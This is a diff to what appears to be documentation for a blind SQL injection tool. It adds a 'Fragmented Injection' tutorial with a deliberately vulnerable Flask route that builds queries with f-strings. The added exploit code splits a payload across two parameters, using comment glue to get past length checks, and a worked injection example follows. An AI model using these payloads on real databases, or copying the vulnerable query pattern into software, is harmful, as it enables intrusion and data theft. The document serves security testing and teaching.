@@ -118,7 +118,7 @@ This second-order vulnerability can be exploited with the following code:
 ```python
 class SecondOrderRequester(Requester):
     async def request(self, query, ctx):
-        # upload payload
+        # upload the payload
         payload = query.render(ctx)
         url = f'http://target.com/register?name=XXX" OR ({payload}) --'
         async with aiohttp.request('post', url):
@@ -129,6 +129,49 @@ class SecondOrderRequester(Requester):
         async with aiohttp.request('get', url) as resp:
             return resp.status == 200
 ```
+
+
+#### Fragmented Injection
+In some cases, the vulnerable application may impose input limitations, such as length checks:
+```python
+@app.route('/users')
+def users():
+    first_name = request.args['first_name']
+    last_name = request.args['last_name']
+    assert len(first_name) < 50 and len(last_name) < 50, 'Name too long.'
+    query = f'SELECT * FROM users WHERE first_name="{first_name}" AND last_name="{last_name}"'
+    ...
+```
+
+The main challenge here is dumping the DB with inputs shorter than 50 characters. One approach is to shorten the injected queries and adjust the extraction logic, but there is a simpler way. We can take advantage of the fact that both `first_name` and `last_name` are inserted into the same SQL statement. The trick is to split the payload into two smaller parts, called _fragments_, inject them through the two inputs, and modify the glue code to avoid breaking the syntax. Here’s how we can exploit it:
+```python
+class FragmentedRequester(Requester):
+    async def request(self, query, ctx):
+        payload = query.render(ctx)
+        frag_1, frag_2 = payload.split('FROM')
+        frag_2 = f'FROM {frag_2}'
+
+        url = f'http://target.com/users?first_name=XXX" OR ({frag_1} /*&last_name=*/ {frag_2}) --'
+        ...
+```
+
+Notice that we split the query at the `FROM` keyword. This prevents the query keywords from being split into multiple fragments, which would break the syntax (e.g., `SELECT column FR` and `OM table`). Additionally, `FROM` is typically near the middle of queries, making it a reasonable splitting point to bypassing length checks.
+
+The glue code has become more complex. As before, the `XXX"` part escapes the string literal, `OR ({frag_1} ... {frag_2})` propagates the boolean query result through the vulnerable statement, and `--` comments out the extra `"`. However, in this case, the glue code must also handle the additional statement code between the two vulnerable inputs, specifically `" AND last_name="`. The easiest way to handle this is by commenting it out using `/* ... */`. Here’s a practical example:
+```SQL
+-- payload: SELECT column < 42 FROM table LIMIT 1 OFFSET 1
+-- frag_1: SELECT column < 42
+-- frag_2: FROM table LIMIT 1 OFFSET 1
+-- first_name: XXX" OR (SELECT column < 42 /*
+-- last_name: */ FROM table LIMIT 1 OFFSET 1) --
+
+-- statement before injection:
+SELECT * FROM users WHERE first_name="{first_name}" AND last_name="{last_name}"
+
+-- statement after injection:
+SELECT * FROM users WHERE first_name="XXX" OR (SELECT column < 42 /*" AND last_name="*/ FROM table LIMIT 1 OFFSET 1) --"
+```
+
 
 
 #### More Tutorials Coming Soon
